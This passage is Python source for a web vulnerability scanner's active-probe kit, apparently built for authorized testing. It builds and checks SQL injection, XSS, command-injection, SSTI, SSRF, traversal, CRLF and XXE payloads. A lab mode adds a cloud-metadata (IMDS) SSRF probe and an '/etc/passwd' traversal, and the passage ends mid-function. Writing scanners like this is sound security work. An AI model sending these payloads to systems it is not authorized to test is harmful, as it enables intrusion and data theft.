"""Safe / Extended / Lab active-probe payload kit for authorized scanning.

Safe Active (default): crawl-safe mini payloads with differential / marker /
callback proof — no DROP/UNION/time-delay, no real IMDS, no /etc/passwd.

Lab Validation: deeper boolean SQLi, encodings, IMDS/passwd canaries — never
auto-enabled for arbitrary public targets.
"""

from __future__ import annotations

import hashlib
import re
import secrets
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

# Probe-result states (screenshot contract)
STATE_NEGATIVE = "negative"
STATE_REFLECTED_ONLY = "reflected_only"
STATE_DIFFERENTIAL = "differential_signal"
STATE_BROWSER_EXEC = "browser_execution_confirmed"
STATE_SERVER_EXEC = "server_execution_confirmed"
STATE_OOB_CALLBACK = "out_of_band_callback_confirmed"
STATE_BLOCKED_WAF = "blocked_by_waf"
STATE_RATE_LIMITED = "rate_limited"
STATE_BASELINE_FAILED = "baseline_failed"
STATE_INCONCLUSIVE = "inconclusive"
STATE_ATTR_BREAKOUT = "attribute_breakout"
STATE_DOM_NODE = "dom_node_injected"
STATE_SINK_CANDIDATE = "sink_context_candidate"

MODES = ("passive", "safe", "extended", "lab")

# Arithmetic SSTI / RCE proof constants (deterministic)
_ARITH_A = 7319
_ARITH_B = 284
_ARITH_SUM = str(_ARITH_A + _ARITH_B)  # 7603

_SQL_ERROR_RE = re.compile(
    r"(?i)(sql syntax|mysql_fetch|mysqli_|ORA-\d{5}|SQLite/JDBCDriver|"
    r"PostgreSQL.*ERROR|unclosed quotation mark|quoted string not properly terminated|"
    r"Microsoft OLE DB Provider for SQL Server|SQLServer JDBC Driver)"
)

_MUTATION_DENY_RE = re.compile(
    r"(?i)/(?:account/delete|checkout|payment|password/change|admin/update|message/send)(?:/|$|\?)"
)

_ACTIVE_CONTAMINATED = frozenset(
    {
        "edge_checkpoint",
        "captcha",
        "rate_limit",
        "generic_waf_deny",
        "origin_failure",
    }
)


def new_probe_nonce() -> str:
    """Short unique nonce per scan/probe batch (e.g. a81f)."""
    return secrets.token_hex(2)


def normalize_mode(mode: str) -> str:
    m = (mode or "safe").strip().lower()
    if m in ("off", "none", "disabled"):
        return "passive"
    if m in MODES:
        return m
    if m in ("full", "default", "on", "true", "1"):
        return "safe"
    return "safe"


@dataclass
class ProbeModeSettings:
    mode: str = "safe"
    callback_base: str = ""
    redirect_proof_host: str = "redirect-proof.vantacrawl-lab.example"
    traversal_fixture_root: str = "/opt/vantacrawl-fixtures"
    max_params: int = 8
    max_forms: int = 3
    # Optional: async (page_url, js_expr) -> Any for XSS browser confirm
    browser_evaluate: Optional[Callable[..., Any]] = None
    # Optional: async (nonce) -> bool for SSRF/XXE OOB confirm
    callback_received: Optional[Callable[..., Any]] = None


@dataclass
class ProbeSpec:
    category: str
    payload: str
    payload_class: str
    param_ok: Callable[[str], bool]
    default_severity: str = "medium"
    # How to confirm
    kind: str = "generic"  # sqli_error | sqli_boolean | xss | rce | ssti | ssrf | traversal | crlf | redirect | xxe
    meta: Dict[str, Any] = field(default_factory=dict)


def _sql_names(name: str) -> bool:
    return bool(
        re.match(
            r"(?i)^(id|uid|user_id|cat|category|item|pid|order|sort|query|q|search|filter|name)$",
            name,
        )
    )


def _xss_names(name: str) -> bool:
    return bool(
        re.match(
            r"(?i)^(q|query|search|s|keyword|term|name|title|message|comment|text|content|input)$",
            name,
        )
    )


def _ssrf_names(name: str) -> bool:
    return bool(
        re.match(
            r"(?i)^(url|uri|link|src|source|dest|destination|redirect|redirect_uri|"
            r"callback|feed|path|site|domain|host|target|fetch|proxy|next|continue|return)$",
            name,
        )
    )


def _file_names(name: str) -> bool:
    return bool(re.match(r"(?i)^(file|path|folder|dir|document|template|include|doc)$", name))


def _cmd_names(name: str) -> bool:
    return bool(re.match(r"(?i)^(cmd|command|exec|execute|run|shell)$", name))


def _redirect_names(name: str) -> bool:
    return bool(
        re.match(
            r"(?i)^(next|url|redirect|redirect_uri|return|returnurl|continue|dest|destination|goto|target)$",
            name,
        )
    )


def _template_names(name: str) -> bool:
    return bool(
        re.match(
            r"(?i)^(q|query|search|name|title|message|template|tpl|view|page|text|content|input)$",
            name,
        )
    )


def build_payload_specs(settings: ProbeModeSettings, nonce: str) -> List[ProbeSpec]:
    """Mini payload set for the selected mode."""
    mode = normalize_mode(settings.mode)
    if mode == "passive":
        return []

    xss_tok = f"VCXSS_{nonce}"
    rce_tok = f"VC_RCE_{nonce}"
    trav_proof = f"VC_TRAVERSAL_PROOF_{nonce}"
    trav_file = f"{settings.traversal_fixture_root.rstrip('/')}/VC_TRAVERSAL_{nonce}.txt"
    # Relative traversal toward fixture (safe profile) — not /etc/passwd
    trav_payload = f"../../../../{trav_file.lstrip('/')}"
    cb = (settings.callback_base or "").rstrip("/")
    redirect_dest = f"https://{settings.redirect_proof_host}/{nonce}"

    specs: List[ProbeSpec] = []

    # --- SQLi (safe): quotes + light booleans; no DROP/UNION/time ---
    for payload, pclass in (
        ("'", "sqli_quote"),
        ('"', "sqli_dquote"),
        ("')", "sqli_quote_paren"),
        ('"))', "sqli_dquote_paren"),
    ):
        specs.append(
            ProbeSpec("sql_injection", payload, pclass, _sql_names, "high", "sqli_error")
        )
    specs.append(
        ProbeSpec(
            "sql_injection",
            "' AND '1'='1",
            "sqli_bool_true_str",
            _sql_names,
            "high",
            "sqli_boolean",
            {"pair": "true", "mate_class": "sqli_bool_false_str"},
        )
    )
    specs.append(
        ProbeSpec(
            "sql_injection",
            "' AND '1'='2",
            "sqli_bool_false_str",
            _sql_names,
            "high",
            "sqli_boolean",
            {"pair": "false", "mate_class": "sqli_bool_true_str"},
        )
    )
    specs.append(
        ProbeSpec(
            "sql_injection",
            "1 AND 1=1",
            "sqli_bool_true_num",
            _sql_names,
            "high",
            "sqli_boolean",
            {"pair": "true", "mate_class": "sqli_bool_false_num", "replace": True},
        )
    )
    specs.append(
        ProbeSpec(
            "sql_injection",
            "1 AND 1=2",
            "sqli_bool_false_num",
            _sql_names,
            "high",
            "sqli_boolean",
            {"pair": "false", "mate_class": "sqli_bool_true_num", "replace": True},
        )
    )

    if mode == "lab":
        # Deeper boolean / encoding variations — lab only
        for payload, pclass in (
            ("' OR '1'='1' -- ", "sqli_lab_or_true"),
            ("' OR '1'='2' -- ", "sqli_lab_or_false"),
            ("%27", "sqli_lab_enc_quote"),
            ("1' AND '1'='1", "sqli_lab_mid_true"),
            ("1' AND '1'='2", "sqli_lab_mid_false"),
        ):
            specs.append(
                ProbeSpec("sql_injection", payload, pclass, _sql_names, "high", "sqli_error")
            )

    # --- XSS ---
    specs.append(
        ProbeSpec("xss", xss_tok, "xss_reflect", _xss_names, "info", "xss", {"token": xss_tok})
    )
    specs.append(
        ProbeSpec(
            "xss",
            f'"><b id="{xss_tok}">{xss_tok}</b>',
            "xss_html_breakout",
            _xss_names,
            "medium",
            "xss",
            {"token": xss_tok, "dom_id": xss_tok},
        )
    )
    specs.append(
        ProbeSpec(
            "xss",
            f'"><svg onload="document.body.dataset.vc=\'{xss_tok}\'">',
            "xss_event_onload",
            _xss_names,
            "medium",
            "xss",
            {"token": xss_tok, "needs_browser": True},
        )
    )
    specs.append(
        ProbeSpec(
            "xss",
            f'" autofocus onfocus="document.body.dataset.vc=\'{xss_tok}\'',
            "xss_attr_onfocus",
            _xss_names,
            "medium",
            "xss",
            {"token": xss_tok, "needs_browser": True},
        )
    )

    # --- RCE (harmless markers / arithmetic) ---
    for payload, pclass in (
        (f";printf {rce_tok}", "rce_printf_semi"),
        (f"&& printf {rce_tok}", "rce_printf_and"),
        (f"| printf {rce_tok}", "rce_printf_pipe"),
        (f"& echo {rce_tok}", "rce_echo_win"),
        (f"&& echo {rce_tok}", "rce_echo_win_and"),
        (f";expr {_ARITH_A} + {_ARITH_B}", "rce_expr"),
    ):
        specs.append(
            ProbeSpec(
                "rce",
                payload,
                pclass,
                _cmd_names,
                "critical",
                "rce",
                {"marker": rce_tok, "arith": _ARITH_SUM},
            )
        )

    # --- SSTI ---
    for payload, pclass in (
        (f"{{{{{_ARITH_A}+{_ARITH_B}}}}}", "ssti_jinja"),
        (f"${{{_ARITH_A}+{_ARITH_B}}}", "ssti_dollar"),
        (f"<%= {_ARITH_A} + {_ARITH_B} %>", "ssti_erb"),
        (f"#{{{_ARITH_A}+{_ARITH_B}}}", "ssti_sharp"),
    ):
        specs.append(
            ProbeSpec(
                "ssti",
                payload,
                pclass,
                _template_names,
                "high",
                "ssti",
                {"arith": _ARITH_SUM, "raw": payload},
            )
        )

    # --- SSRF ---
    if cb:
        specs.append(
            ProbeSpec(
                "ssrf",
                f"{cb}/{nonce}/ping",
                "ssrf_callback_ping",
                _ssrf_names,
                "high",
                "ssrf",
                {"nonce": nonce, "callback": True},
            )
        )
        specs.append(
            ProbeSpec(
                "ssrf",
                f"{cb}/{nonce}/redirect",
                "ssrf_callback_redirect",
                _ssrf_names,
                "high",
                "ssrf",
                {"nonce": nonce, "callback": True},
            )
        )
    if mode in ("extended", "lab") or (mode == "lab"):
        pass
    if mode == "lab":
        # Lab-only: cloud metadata (authorized lab fixtures)
        specs.append(
            ProbeSpec(
                "ssrf",
                "http://169.254.169.254/latest/meta-data/",
                "ssrf_imds_lab",
                _ssrf_names,
                "high",
                "ssrf",
                {"imds": True},
            )
        )

    # --- Traversal ---
    specs.append(
        ProbeSpec(
            "directory_traversal",
            trav_payload,
            "trav_canary",
            _file_names,
            "high",
            "traversal",
            {"proof": trav_proof},
        )
    )
    if mode in ("extended", "lab"):
        specs.append(
            ProbeSpec(
                "directory_traversal",
                trav_payload.replace("/", "%2f"),
                "trav_canary_enc",
                _file_names,
                "high",
                "traversal",
                {"proof": trav_proof},
            )
        )
    if mode == "lab":
        specs.append(
            ProbeSpec(
                "directory_traversal",
                trav_payload.replace("/", "%252f"),
                "trav_canary_dblenc",
                _file_names,
                "high",
                "traversal",
                {"proof": trav_proof},
            )
        )
        specs.append(
            ProbeSpec(
                "directory_traversal",
                "../../../../etc/passwd",
                "trav_passwd_lab",
                _file_names,
                "critical",
                "traversal",
                {"proof_re": r"(?i)root:x:0:0:"},
            )
        )

    # --- Open redirect ---
    for payload, pclass in (
        (redirect_dest, "redirect_abs"),
        (f"//{settings.redirect_proof_host}/{nonce}", "redirect_proto_rel"),
    ):
        specs.append(
            ProbeSpec(
                "open_redirect",
                payload,
                pclass,
                _redirect_names,
                "high",
                "redirect",
                {"host": settings.redirect_proof_host},
            )
        )

    # --- CRLF ---
    specs.append(
        ProbeSpec(
            "header_injection",
            f"%0d%0aX-VantaCrawl-Proof:%20{nonce}",
            "crlf_header",
            lambda n: bool(re.match(r"(?i)^(q|query|search|name|url|redirect|next|file|path)$", n)),
            "high",
            "crlf",
            {"header": "x-vantacrawl-proof", "value": nonce},
        )
    )

    # --- XXE (lab only, OOB callback) ---
    if mode == "lab" and cb:
        xxe = (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{cb}/{nonce}/xxe">]>'
            "<r>&xxe;</r>"
        )
        specs.append(
            ProbeSpec(
                "xxe",
                xxe,
                "xxe_oob",
                lambda n: bool(re.match(r"(?i)^(xml|body|data|payload|content)$", n)),
                "high",
                "xxe",
                {"nonce": nonce, "callback": True},
            )
        )

    return specs


def normalize_probe_text(text: str) -> str:
    t = (text or "").lower()
    t = re.sub(r"(?is)<script\b[^>]*>.*?</script>", " ", t)
    t = re.sub(r"(?is)<style\b[^>]*>.*?</style>", " ", t)
    t = re.sub(
        r"(?i)(?:csrf(?:[_-]?token)?|_token|nonce|request[_-]?id|session(?:id)?|authenticity_token)"
        r"[\s\"'=:]+[a-z0-9_\-]{1,}",
        "#tok",
        t,
    )
    t = re.sub(r"\b[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}\b", "#", t)
    t = re.sub(r"\b[a-f0-9]{8,}\b", "#", t)
    t = re.sub(r"\b\d{10,13}\b", "#", t)
    t = re.sub(r"\b\d{4,}\b", "#", t)
    return re.sub(r"\s+", " ", t).strip()


def probe_hash(text: str) -> str:
    return hashlib.sha256(normalize_probe_text(text).encode("utf-8", errors="replace")).hexdigest()[:32]


def _strip_literals(body: str, *literals: str) -> str:
    t = body or ""
    for lit in literals:
        if lit:
            t = t.replace(lit, "#")
    return t


def bodies_differ(a: str, b: str, *, ignore: Sequence[str] = ()) -> bool:
    if ignore:
        a = _strip_literals(a, *ignore)
        b = _strip_literals(b, *ignore)
    return normalize_probe_text(a) != normalize_probe_text(b)


def classify_response(status_code: int, body: str = "", headers: Optional[Dict[str, Any]] = None) -> str:
    if int(status_code or 0) <= 0:
        return "origin_failure"
    body_l = (body or "").lower()[:12000]
    try:
        from edge_checkpoint import is_edge_checkpoint

        if is_edge_checkpoint(status_code, body, headers):
            return "edge_checkpoint"
    except Exception:
        pass
    try:
        from evasion_layer import detect_challenge

        ch = (detect_challenge(status_code, body, headers) or "").lower()
        if ch in ("rate_limit", "akamai_rate_burst") or int(status_code or 0) == 429:
            return "rate_limit"
        if any(tok in ch for tok in ("captcha", "recaptcha", "hcaptcha", "turnstile")):
            return "captcha"
        if ch in ("waf_block", "akamai_soft_deny", "cloudflare_soft_deny", "soft_deny") or any(
            tok in ch for tok in ("cloudflare", "akamai", "datadome", "perimeterx")
        ):
            return "generic_waf_deny"
        if "checkpoint" in ch:
            return "edge_checkpoint"
        if ch:
            return "generic_waf_deny"
    except Exception:
        pass
    if int(status_code or 0) == 429:
        return "rate_limit"
    if re.search(
        r"(?i)(sql\s*injection\s*detected|xss\s*(?:attack\s*)?detected|attack\s*detected|"
        r"request\s*blocked|web\s*application\s*firewall)",
        body_l,
    ) and re.search(
        r"(?i)(waf|cloudflare|akamai|blocked|denied|forbidden|firewall|modsecurity)",
        body_l,
    ):
        return "generic_waf_deny"
    return "application_response"


def is_contaminated(classification: str) -> bool:
    return (classification or "") in _ACTIVE_CONTAMINATED


def mutation_blocked(action: str, method: str) -> bool:
    if (method or "GET").upper() != "POST":
        return False
    path = urlparse(action or "").path or action or ""
    return bool(_MUTATION_DENY_RE.search(path))


def _html_escape(s: str) -> str:
    return (
        (s or "")
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#39;")
    )


def classify_xss(body: str, token: str, baseline: str, *, payload: str = "", dom_id: str = "") -> Optional[Dict[str, str]]:
    text = body or ""
    base = baseline or ""
    enc = _html_escape(token)

    def _raw_token_present(blob: str) -> bool:
        """True when token appears outside HTML-entity encoding wrappers."""
        for m in re.finditer(re.escape(token), blob):
            prefix = blob[max(0, m.start() - 5) : m.start()].lower()
            if prefix.endswith("&lt;") or prefix.endswith("&#60;") or prefix.endswith("&amp;lt;"):
                continue
            return True
        return False

    # Encoded-only (e.g. &lt;VCXSS_a81f&gt;) → not vulnerable
    if not _raw_token_present(text) and not (dom_id and re.search(rf'(?is)<b\b[^>]*\bid=["\']?{re.escape(dom_id)}', text)):
        return None
    if enc in text and not _raw_token_present(text) and not (
        dom_id and re.search(rf'(?is)<b\b[^>]*\bid=["\']?{re.escape(dom_id)}', text)
    ):
        return None
    if _raw_token_present(base) and not (dom_id and f'id="{dom_id}"' in text and f'id="{dom_id}"' not in base):
        # Token already in baseline as raw text — not a probe effect
        if not (dom_id and re.search(rf'(?is)<b\b[^>]*\bid=["\']?{re.escape(dom_id)}', text)):
            return None

    # Injected DOM node
    if dom_id and re.search(rf'(?is)<b\b[^>]*\bid=["\']?{re.escape(dom_id)}', text):
        return {
            "severity": "medium",
            "detail_bit": "DOM node injected (medium-confidence; not browser-confirmed)",
            "validation_state": STATE_DOM_NODE,
            "confidence": "medium",
            "verification": "verified",
        }

    if re.search(r"(?is)<script\b[^>]*>[^<]{0,200}" + re.escape(token), text) or re.search(
        r"(?is)\bon\w+\s*=\s*['\"][^'\"]{0,80}" + re.escape(token),
        text,
    ):
        return {
            "severity": "medium",
            "detail_bit": "sink-context candidate (not browser-confirmed execution)",
            "validation_state": STATE_SINK_CANDIDATE,
            "confidence": "medium",
            "verification": "verified",
        }

    if "onload=" in payload or "onfocus=" in payload:
        if _raw_token_present(text):
            return {
                "severity": "medium",
                "detail_bit": "attribute/context breakout candidate (not browser-confirmed)",
                "validation_state": STATE_ATTR_BREAKOUT,
                "confidence": "medium",
                "verification": "verified",
            }

    if _raw_token_present(text):
        return {
            "severity": "info",
            "detail_bit": "unverified reflection candidate (raw text; not proven executable)",
            "validation_state": STATE_REFLECTED_ONLY,
            "confidence": "low",
            "verification": "detected",
        }
    return None


def build_proof(**kwargs: Any) -> Dict[str, Any]:
    baseline_body = kwargs.get("baseline_body") or ""
    probe_body = kwargs.get("probe_body") or ""
    resp_class = kwargs.get("response_classification") or "application_response"
    evidence_line = kwargs.get("evidence_line") or ""
    return {
        "endpoint": kwargs.get("endpoint") or "",
        "method": kwargs.get("method") or "GET",
        "parameter": kwargs.get("parameter") or "",
        "baseline_status": int(kwargs.get("baseline_status") or 0),
        "probe_status": int(kwargs.get("probe_status") or 0),
        "baseline_normalized_hash": probe_hash(baseline_body),
        "probe_normalized_hash": probe_hash(probe_body),
        "payload_class": kwargs.get("payload_class") or "",
        "new_evidence": list(kwargs.get("new_evidence") or []),
        "response_classification": resp_class,
        "waf_or_checkpoint": is_contaminated(resp_class),
        "confidence": kwargs.get("confidence") or "medium",
        "validation_state": kwargs.get("validation_state") or STATE_DIFFERENTIAL,
        "request_proof_redacted": (
            f"{kwargs.get('method')} {kwargs.get('endpoint')} "
            f"param={kwargs.get('parameter')} class={kwargs.get('payload_class')}"
        )[:500],
        "response_proof_redacted": (evidence_line or probe_body[:240])[:500],
        "evidence": evidence_line[:2000],
        "request": f"{kwargs.get('method')} {kwargs.get('endpoint')}"[:500],
        "response": (probe_body or "")[:500],
    }


def _imds_proof(body: str, baseline: str) -> bool:
    re_imds = re.compile(
        r"(?i)(\"ami-id\"\s*:|\"instance-id\"\s*:|ami-[0-9a-f]{8,}|i-[0-9a-f]{8,}|"
        r"instance-id|local-ipv4|public-ipv4)"
    )
    if not re_imds.search(body or ""):
        return False
    if re_imds.search(baseline or ""):
        return False
    return True


async def run_active_probe_kit(
    client,
    url: str,
    forms: Optional[List[dict]] = None,
    *,
    settings: Optional[ProbeModeSettings] = None,
    body_text: str = "",
) -> List[Any]:
    """Execute the mini/extended/lab payload kit with baseline + repeat confirmation."""
    settings = settings or ProbeModeSettings()
    mode = normalize_mode(settings.mode)
    if mode == "passive":
        return []

    nonce = new_probe_nonce()
    specs = build_payload_specs(settings, nonce)
    findings: List[Any] = []
    seen: set = set()

    def add(category: str, severity: str, detail: str, evidence: Optional[str], meta: Dict[str, Any]):
        key = (category, detail, evidence or "", meta.get("proof", {}).get("validation_state"))
        if key in seen:
            return
        seen.add(key)
        findings.append((category, severity, detail, evidence, meta))

    async def _send(method: str, target: str, values: dict, *, follow: bool = True):
        if method == "POST":
            return await client.post(target, data=values, timeout=8, follow_redirects=follow)
        return await client.get(target, params=values, timeout=8, follow_redirects=follow)

    def _meta(resp) -> Tuple[int, str, Dict[str, Any], str]:
        status = int(getattr(resp, "status_code", 200) or 200)
        body = getattr(resp, "text", None) or ""
        headers = dict(getattr(resp, "headers", None) or {})
        final = str(getattr(resp, "url", "") or "")
        return status, body, headers, final

    sql_names = re.compile(
        r"(?i)^(id|uid|user_id|cat|category|item|pid|order|sort|query|q|search|filter|name)$"
    )

    async def probe_field(
        method: str,
        target: str,
        field: str,
        values: dict,
        source: str,
        baseline_body: str,
        baseline_status: int,
        baseline_ok: bool,
        baseline_final: str,
    ):
        # Harmless nonce control (comparison step 2)
        control_vals = dict(values)
        control_vals[field] = f"VCCTRL_{nonce}"
        try:
            ctrl_resp = await _send(method, target, control_vals)
            _, ctrl_body, ctrl_hdrs, _ = _meta(ctrl_resp)
            ctrl_class = classify_response(int(getattr(ctrl_resp, "status_code", 200) or 200), ctrl_body, ctrl_hdrs)
            if is_contaminated(ctrl_class):
                return
        except Exception:
            ctrl_body = baseline_body

        # Cache boolean pair bodies for true/false compare
        bool_bodies: Dict[str, str] = {}

        for spec in specs:
            if not spec.param_ok(field):
                continue
            if spec.kind in ("sqli_error", "sqli_boolean", "ssrf", "rce", "traversal", "ssti") and not baseline_ok:
                continue

            trial = dict(values)
            if spec.meta.get("replace"):
                trial[field] = spec.payload
            elif spec.kind == "xss" and spec.payload_class != "xss_reflect":
                trial[field] = spec.payload
            elif spec.kind in ("redirect", "ssrf", "ssti", "crlf", "xxe", "traversal"):
                trial[field] = spec.payload
            else:
                trial[field] = str(trial.get(field) or "1") + spec.payload

            try:
                follow = spec.kind != "redirect"
                resp = await _send(method, target, trial, follow=follow)
                # CRLF: also try without following; headers matter
                p_status, p_body, p_hdrs, p_final = _meta(resp)
                resp_class = classify_response(p_status, p_body, p_hdrs)
                if is_contaminated(resp_class):
                    continue

                hit = False
                severity = spec.default_severity
                validation_state = STATE_DIFFERENTIAL
                confidence = "medium"
                verification = "verified"
                detail_bit = "differential signal"
                new_evidence: List[str] = []
                evidence_line = ""

                if spec.kind == "sqli_error":
                    if not _SQL_ERROR_RE.search(p_body or ""):
                        continue
                    if _SQL_ERROR_RE.search(baseline_body or ""):
                        continue
                    # Reproduce (step 4)
                    resp2 = await _send(method, target, trial, follow=True)
                    _, body2, hdrs2, _ = _meta(resp2)
                    if is_contaminated(classify_response(int(getattr(resp2, "status_code", 200) or 200), body2, hdrs2)):
                        continue
                    if not _SQL_ERROR_RE.search(body2 or ""):
                        continue
                    hit = True
                    m = _SQL_ERROR_RE.search(p_body or "")
                    new_evidence = [(m.group(0) if m else "SQL error")[:120]]
                    evidence_line = f"sql_error: {new_evidence[0]}"
                    detail_bit = "differential signal (new database error, reproduced)"
                    validation_state = STATE_DIFFERENTIAL

                elif spec.kind == "sqli_boolean":
                    bool_bodies[spec.payload_class] = p_body
                    mate = spec.meta.get("mate_class") or ""
                    if mate not in bool_bodies:
                        continue
                    # Emit once when both sides cached (on the false leg)
                    if spec.meta.get("pair") != "false":
                        continue
                    true_class = mate
                    false_class = spec.payload_class
                    true_body = bool_bodies.get(true_class, "")
                    false_body = bool_bodies.get(false_class, "")
                    # Resolve payloads for stripping reflected probe text
                    true_payload = next(
                        (s.payload for s in specs if s.payload_class == true_class), ""
                    )
                    false_payload = spec.payload
                    # Strip probe payloads only — never the base field value (e.g. "1")
                    ignore = tuple(p for p in (true_payload, false_payload) if len(p) >= 3)
                    if not bodies_differ(true_body, false_body, ignore=ignore):
                        continue
                    if not bodies_differ(true_body, baseline_body, ignore=ignore) and not bodies_differ(
                        false_body, baseline_body, ignore=ignore
                    ):
                        continue
                    # Stable: repeat false
                    resp2 = await _send(method, target, trial, follow=True)
                    _, body2, _, _ = _meta(resp2)
                    if not bodies_differ(true_body, body2, ignore=ignore):
                        continue
                    # Require false replay still aligns with false (normalized), else inconclusive
                    if bodies_differ(false_body, body2, ignore=ignore):
                        continue
                    hit = True
                    severity = "high"
                    detail_bit = "differential signal (stable boolean true/false response split)"
                    validation_state = STATE_DIFFERENTIAL
                    new_evidence = ["boolean true/false body divergence"]
                    evidence_line = "sqli_boolean: true/false normalized bodies differ"

                elif spec.kind == "xss":
                    token = str(spec.meta.get("token") or "")
                    disp = classify_xss(
                        p_body,
                        token,
                        baseline_body,
                        payload=spec.payload,
                        dom_id=str(spec.meta.get("dom_id") or ""),
                    )
                    # Optional browser confirm
                    if spec.meta.get("needs_browser") and settings.browser_evaluate:
                        try:
                            page_url = str(p_final or target)
                            ok = await settings.browser_evaluate(
                                page_url, f"document.body.dataset.vc === '{token}'"
                            )
                            if ok:
                                hit = True
                                severity = "high"
                                detail_bit = "browser execution confirmed (dataset.vc marker)"
                                validation_state = STATE_BROWSER_EXEC
                                confidence = "high"
                                verification = "confirmed"
                                new_evidence = [f"dataset.vc={token}"]
                                evidence_line = f"browser_exec: dataset.vc={token}"
                                disp = None  # already handled
                        except Exception:
                            pass
                    if disp:
                        hit = True
                        severity = disp["severity"]
                        detail_bit = disp["detail_bit"]
                        validation_state = disp["validation_state"]
                        confidence = disp["confidence"]
                        verification = disp["verification"]
                        new_evidence = [detail_bit]
                        evidence_line = f"xss: {token}"

                elif spec.kind == "rce":
                    marker = str(spec.meta.get("marker") or "")
                    arith = str(spec.meta.get("arith") or "")
                    if marker and marker in (baseline_body or ""):
                        continue
                    # Reflection of full payload is not execution
                    if spec.payload in (p_body or "") and marker and marker in p_body:
                        # If only appears as part of reflected command string, skip
                        if f"printf {marker}" in p_body or f"echo {marker}" in p_body:
                            if arith and arith in p_body and arith not in (baseline_body or ""):
                                pass  # math proof wins
                            else:
                                continue
                    exec_hit = False
                    if arith and arith in (p_body or "") and arith not in (baseline_body or ""):
                        if spec.payload not in p_body:  # result without raw expr reflection-only
                            exec_hit = True
                            new_evidence = [f"arith_result={arith}"]
                        elif bodies_differ(baseline_body, p_body) and arith in p_body:
                            # expr reflected AND result present
                            if f"expr {_ARITH_A}" in p_body and p_body.count(arith) >= 1:
                                # require result outside the payload echo — simple heuristic
                                stripped = p_body.replace(spec.payload, "")
                                if arith in stripped:
                                    exec_hit = True
                                    new_evidence = [f"arith_result={arith}"]
                    if marker and marker in (p_body or ""):
                        if f"printf {marker}" not in p_body and f"echo {marker}" not in p_body:
                            if not re.search(r"(?is)<!--[^>]*" + re.escape(marker), p_body) or p_body.count(marker) > 1:
                                exec_hit = True
                                new_evidence = [f"marker={marker}"]
                    if not exec_hit:
                        continue
                    hit = True
                    severity = "critical"
                    detail_bit = "confirmed server-side behavior (command output / arith)"
                    validation_state = STATE_SERVER_EXEC
                    confidence = "high"
                    verification = "confirmed"
                    evidence_line = ",".join(new_evidence)

                elif spec.kind == "ssti":
                    arith = str(spec.meta.get("arith") or "")
                    raw = str(spec.meta.get("raw") or spec.payload)
                    if arith not in (p_body or ""):
                        continue
                    if arith in (baseline_body or ""):
                        continue
                    if raw in (p_body or "") and p_body.count(arith) == 0:
                        continue
                    # Raw expression reflected without evaluation → negative
                    if raw in p_body and arith not in p_body.replace(raw, ""):
                        continue
                    # Confirm evaluation: 7603 present, expression preferably absent or also evaluated
                    stripped = p_body.replace(raw, "")
                    if arith not in stripped and raw in p_body:
                        continue
                    if arith not in p_body:
                        continue
                    hit = True
                    severity = "high"
                    detail_bit = "confirmed server-side behavior (SSTI arithmetic evaluated)"
                    validation_state = STATE_SERVER_EXEC
                    confidence = "high"
                    verification = "confirmed"
                    new_evidence = [f"ssti_result={arith}"]
                    evidence_line = f"ssti: {arith}"

                elif spec.kind == "ssrf":
                    if spec.meta.get("callback"):
                        confirmed = False
                        if settings.callback_received:
                            try:
                                confirmed = bool(
                                    await settings.callback_received(str(spec.meta.get("nonce") or nonce))
                                )
                            except Exception:
                                confirmed = False
                        if confirmed:
                            hit = True
                            severity = "high"
                            detail_bit = "out-of-band callback confirmed (SSRF)"
                            validation_state = STATE_OOB_CALLBACK
                            confidence = "high"
                            verification = "confirmed"
                            new_evidence = [f"callback_nonce={nonce}"]
                            evidence_line = f"ssrf_callback: {nonce}"
                        else:
                            # Without listener: never confirm on URL echo
                            continue
                    elif spec.meta.get("imds"):
                        if not _imds_proof(p_body, baseline_body):
                            continue
                        hit = True
                        severity = "high"
                        detail_bit = "confirmed server-side behavior (IMDS proof — lab)"
                        validation_state = STATE_SERVER_EXEC
                        confidence = "high"
                        verification = "confirmed"
                        new_evidence = ["imds_metadata_token"]
                        evidence_line = "ssrf_imds"

                elif spec.kind == "traversal":
                    proof = str(spec.meta.get("proof") or "")
                    proof_re = spec.meta.get("proof_re")
                    ok = False
                    if proof and proof in (p_body or "") and proof not in (baseline_body or ""):
                        ok = True
                        new_evidence = [proof]
                    if proof_re and re.search(str(proof_re), p_body or "") and not re.search(
                        str(proof_re), baseline_body or ""
                    ):
                        ok = True
                        new_evidence = ["passwd_marker"]
                    if not ok:
                        continue
                    hit = True
                    severity = spec.default_severity
                    detail_bit = "confirmed server-side behavior (traversal canary/proof)"
                    validation_state = STATE_SERVER_EXEC
                    confidence = "high"
                    verification = "confirmed"
                    evidence_line = ",".join(new_evidence)

                elif spec.kind == "redirect":
                    host = str(spec.meta.get("host") or "")
                    location = ""
                    for hk, hv in p_hdrs.items():
                        if str(hk).lower() == "location":
                            location = str(hv or "")
                            break
                    blob = f"{location} {p_final}".lower()
                    if host.lower() not in blob:
                        continue
                    hit = True
                    severity = "high"
                    detail_bit = "confirmed open redirect to controlled host"
                    validation_state = STATE_SERVER_EXEC
                    confidence = "high"
                    verification = "confirmed"
                    new_evidence = [f"Location/final→{host}"]
                    evidence_line = f"redirect: {location or p_final}"

                elif spec.kind == "crlf":
                    hdr_name = str(spec.meta.get("header") or "").lower()
                    hdr_val = str(spec.meta.get("value") or "")
                    found = False
                    for hk, hv in p_hdrs.items():
                        if str(hk).lower() == hdr_name and hdr_val in str(hv or ""):
                            found = True
                            break
                    # Body/URL reflection alone is NOT confirmation
                    if not found:
                        continue
                    hit = True
                    severity = "high"
                    detail_bit = "confirmed CRLF/header injection (response header)"
                    validation_state = STATE_SERVER_EXEC
                    confidence = "high"
                    verification = "confirmed"
                    new_evidence = [f"{hdr_name}: {hdr_val}"]
                    evidence_line = f"crlf_header: {hdr_name}={hdr_val}"

                elif spec.kind == "xxe":
                    if settings.callback_received:
                        try:
                            confirmed = bool(
                                await settings.callback_received(str(spec.meta.get("nonce") or nonce))
                            )
                        except Exception:
                            confirmed = False
                        if confirmed:
                            hit = True
                            severity = "high"
                            detail_bit = "out-of-band callback confirmed (XXE)"
                            validation_state = STATE_OOB_CALLBACK
                            confidence = "high"
                            verification = "confirmed"
                            new_evidence = [f"xxe_callback={nonce}"]
